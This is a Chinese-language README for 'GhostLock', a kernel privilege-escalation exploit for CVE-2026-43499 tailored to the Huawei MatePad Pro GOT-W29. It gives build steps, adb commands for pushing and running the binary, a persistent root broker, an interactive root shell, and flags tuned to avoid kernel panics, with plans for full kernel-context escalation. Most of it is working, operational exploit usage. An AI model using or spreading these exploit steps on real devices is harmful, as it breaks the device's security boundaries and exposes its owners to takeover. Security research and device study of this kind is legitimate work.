# GhostLock GOT-W29

HUAWEI MatePad Pro 11（GOT-W29，SM8250 / Snapdragon 870，HarmonyOS 4.x，
kernel `4.19.157-perf+`）的 CVE-2026-43499 提权适配。

当前状态：

- A 路线真机完成：合法 private root cred，SELinux 保持 `u:r:shell:s0`
- 持久 root broker：`@gl_su`
- 完整 PTY root shell：Ctrl-C、方向键、后台作业控制均可用
- arbitrary read 使用独立 `random/uuid` ctl_table，不修改 boot_id 和 ashmem 节点
- App 冷启动验证通过
- B 路线（`u:r:kernel:s0` + full caps）仍是 TODO

完整原理、偏移、失败模式和历史记录见 [TECHNICAL.md](TECHNICAL.md)。

## 构建

```sh
cd exploit/ghostlock-source
make -j3
```

产物：

```text
exploit/ghostlock-source/build/bin/ghostlock_exe
```

当前机器使用 NDK sysroot + host clang 交叉编译，详见
[exploit/ghostlock-source/TOOLCHAIN.md](exploit/ghostlock-source/TOOLCHAIN.md)。

## 真机启动

```sh
adb push exploit/ghostlock-source/build/bin/ghostlock_exe /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_exe
```

启动 A 路线 broker：

```sh
adb shell /data/local/tmp/ghostlock_exe \
  --su-server --simple-root --fake-lock-window \
  --detach --probe-cycle --no-rt --attempts 1 \
  --leak-timeout 60 --fsync \
  --log-file /sdcard/ghostlock-su.log
```

成功时日志包含：

```text
simple-root: LEGAL ROOT uid=0 euid=0 ctx=u:r:shell:s0
su: uid=0 euid=0 serving on abstract @gl_su
```

## 使用

从另一个 adb shell 执行：

```sh
adb shell /data/local/tmp/ghostlock_exe --rsh STATUS
adb shell /data/local/tmp/ghostlock_exe --rsh id
adb shell /data/local/tmp/ghostlock_exe --rsh '你的命令'
```

交互式 root shell 必须使用 `-t`：

```sh
adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell
```

broker 为 shell 分配真实控制终端，因此 `tty` 应显示 `/dev/pts/N`，
Ctrl-C、方向键、`jobs` 和前后台切换均正常。

## 安全说明

- `--fake-lock-window` 和 `--detach` 是当前真机安全运行的关键参数。
- 不要使用 `--hold`；不要直接用 `kill -9` 结束已经消费悬空 waiter 的 worker。
- 失败 attempt 可能触发 oops/panic，真机保持 `--attempts 1`。
- 清理 detach worker 应重启设备。
- `--verify-write`、`--verify-read`、`--verify-all` 是 boot_id 写原语自检，
  会污染 boot_id high 8 字节，只应在 QEMU 或明确接受风险时运行。
- 不要用 `--escalate` 代替 A 路线；它保留给 B 路线研究，存在 cred 生命周期风险。

## QEMU

```sh
cd tools/qemu-test
GLMODE="--simple-root --detach" GDB=0 ./build_and_run.sh
./read_log.py --wait 240 --until 'simple-root: LEGAL ROOT|simple-root: failed'
```

QEMU 细节见 [tools/qemu-test/README.md](tools/qemu-test/README.md)。

## B 路线 TODO

目标：获得 `u:r:kernel:s0` 和完整 capability。

待解决：

- cred/security 生命周期和 RCU 回收
- kernel 域 exec 用户态程序
- kernel 域 socket bind / mount / 文件访问策略
- fork root child 与 SID 继承
- permissive/SID 修复是否会引入全局副作用

## 主要参数

```text
--simple-root             A 路线提权
--su-server               启动 root broker
--rsh CMD                 执行单条命令
--rsh-shell               完整 PTY 交互 shell
--fake-lock-window        使用栈内私有 fake lock（真机推荐）
--detach                  永久保活已消费 waiter 的 worker
--probe-cycle             当前内核稳定的 EDEADLK 触发方式
--no-rt                   避免 RT waiter 饿死 CFS
--attempts 1              真机失败不重试
--log-file PATH           持久日志
--fsync                   final-result 写入落盘
```

`--help` 可列出全部自检和研究参数。
